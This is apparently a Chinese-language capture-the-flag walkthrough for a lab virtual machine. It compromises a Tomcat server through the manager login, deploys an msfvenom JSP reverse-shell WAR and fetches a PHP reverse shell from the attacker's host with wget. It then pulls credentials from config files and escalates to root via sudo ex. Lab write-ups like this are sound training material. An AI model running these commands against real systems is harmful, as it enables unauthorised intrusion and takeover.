## 复盘*

## 靶机地址

[Proton Drive](https://drive.proton.me/urls/K2MFXVCBYR#6tPKBbXzpqwF)

![image-20250321150448469](assets/image-20250321150448469.png)



## 信息收集

### nmap扫描

#### 准备阶段

```
mkdir nmapscan
```

![image-20250321150534237](assets/image-20250321150534237.png)

创建文件夹用来存放nmap扫描结果



#### 主机探测

```
nmap -sn 192.168.1.0/24
```

![image-20250321150600139](assets/image-20250321150600139.png)

确定靶机ip：

192.168.1.14



#### 端口扫描

```
nmap -sT -p- --min-rate 10000 192.168.1.14 -oA ./nmapscan/ports
```

![image-20250321150651219](assets/image-20250321150651219.png)

开放了：

- 22 ssh服务

- 80 http服务

- 8080 http服务

  

#### 提取端口信息

```
ports
```

![image-20250321150728117](assets/image-20250321150728117.png)![image-20250321150744961](assets/image-20250321150744961.png)



#### 详细结果扫描

```
nmap -sT -sV -sC -O -p 22,80,8080 192.168.1.14 -oA ./nmapscan/detail
```

![image-20250321150828022](assets/image-20250321150828022.png)

分析：

- 22 ssh OpenSSH 8.4p1
- 80 http Apache httpd 2.4.56
- 8080 http Tomcat



### 80端口

#### 访问192.168.1.14

![image-20250321150940925](assets/image-20250321150940925.png)

apache主页

查看源码无内容



#### 目录扫描

```
dirsearch -u http://192.168.1.14
```

![image-20250321151016196](assets/image-20250321151016196.png)

![image-20250321151033066](assets/image-20250321151033066.png)

无结果，gobuster跑了一遍也是没结果



### 8080端口

#### 访问192.168.1.14:8080

![image-20250321151122004](assets/image-20250321151122004.png)

![image-20250321151143463](assets/image-20250321151143463.png)

tomcat主页



#### 提示可以访问Manager Web和host-manager web

![image-20250321151229798](assets/image-20250321151229798.png)

需要密码





#### 尝试tomcat弱口令密码

```
tomcat:tomcat
```

登录失败，但是出现跳转

![image-20250321151311495](assets/image-20250321151311495.png)

#### 存在manager-gui用户





#### 得到一个账号和密码

```
tomcat:s3cret
```



#### 成功登录

![image-20250321151359628](assets/image-20250321151359628.png)



#### msfvenom生成war包

```
msfvenom -p java/jsp_shell_reverse_tcp Lhost=192.168.1.3 lport=283 -f war -o ra1n3.war
```

![image-20250321151504183](assets/image-20250321151504183.png)



#### 上传war包

![image-20250321151539625](assets/image-20250321151539625.png)

![image-20250321151547205](assets/image-20250321151547205.png)

成功上传



#### msfconsole开启监听

```
msfconsole
use exploit/multi/handler
set payload java/jsp_shell_reverse_tcp
set lhost 192.168.1.3
set lport 283
run
```

![image-20250321151713156](assets/image-20250321151713156.png)

触发war包（点击）

![image-20250321151805235](assets/image-20250321151805235.png)

![image-20250321151814681](assets/image-20250321151814681.png)

成功弹回shell



## 提权

### script转换终端

```
/usr/bin/script -qc /bin/bash /dev/null
```

![image-20250321151844277](assets/image-20250321151844277.png)



### 查看用户信息

```
cat /etc/passwd
```

![image-20250321151942329](assets/image-20250321151942329.png)

存在：

- sa
- toor



### 在conf目录下发现sa用户的密码

```
ls -al
cd conf 
ls -al
cat tomcat-users.xml
```

![image-20250321152105930](assets/image-20250321152105930.png)

```
sa:salala!!
```



### ssh登录

```
ssh sa@192.168.1.14
```

![image-20250321152147235](assets/image-20250321152147235.png)



### 执行sudo -l

```
sudo -l
```

![image-20250321152212519](assets/image-20250321152212519.png)

无信息



### suid查找

```
find / -perm -4000 2>/dev/null
```

![image-20250321152337319](assets/image-20250321152337319.png)

无信息



### 进入toor的家目录

```
cd ..
ls -al
cd toor
```

![image-20250321152712537](assets/image-20250321152712537.png)

失败



### 查看apache进程

```
ps -ef | grep apache
```

![image-20250321152526454](assets/image-20250321152526454.png)

属于toor用户

也就是说，如果我们能从80端口拿到一个反弹shell，也就相当于拿到了toor用户的shell



### 查看网站目录权限

```
cd /var/www/html
ls -al
```

![image-20250321152850908](assets/image-20250321152850908.png)

可以写内容



### 本地开启http服务

```
python -m http.server
```

![image-20250321153030568](assets/image-20250321153030568.png)



### 上传至目标主机

```
wget 192.168.1.3:8000/php-reverse-shell.php
```

![image-20250321153107927](assets/image-20250321153107927.png)



### 本地开启监听

```
nc -lvp 2999
```

![image-20250321153150669](assets/image-20250321153150669.png)



### 浏览器中触发该脚本

![image-20250321153215082](assets/image-20250321153215082.png)



### 成功反弹shell

![image-20250321153229192](assets/image-20250321153229192.png)





### 执行sudo -l

```
sudo -l
```

![image-20250321154043692](assets/image-20250321154043692.png)



### ex提权

```
sudo ex
!/bin/sh
whoami
```

![image-20250321154103992](assets/image-20250321154103992.png)



### 得到flag

```
cd /root
ls -al
cat root.txt
```

![image-20250321154129337](assets/image-20250321154129337.png)





## 注意：

当我们进入/var/www/html上传弹shell脚本时，不能直接从攻击机的web服务器wget php脚本，因为它会先在攻击机的web服务器解析，此时我们如果触发该脚本拿到的不是toor用户的shell



如果先wget，再开启监听，当在浏览器触发该脚本时，会提示连接被拒绝

![image-20250321154612018](assets/image-20250321154612018.png)

![image-20250321154626203](assets/image-20250321154626203.png)

![image-20250321154901801](assets/image-20250321154901801.png)





而如果先监听，再wget，则弹回的时攻击机的shell

![image-20250321155046474](assets/image-20250321155046474.png)





而如果我们将php脚本改一下后缀名（如txt），然后在攻击机上wget后再改回来，那么就不会在本地解析，从而可以拿到toor用户的shell

![image-20250321155228345](assets/image-20250321155228345.png)

![image-20250321155242132](assets/image-20250321155242132.png)

![image-20250321155256216](assets/image-20250321155256216.png)

![image-20250321155314184](assets/image-20250321155314184.png)

![image-20250321155326629](assets/image-20250321155326629.png)

![image-20250321155333073](assets/image-20250321155333073.png)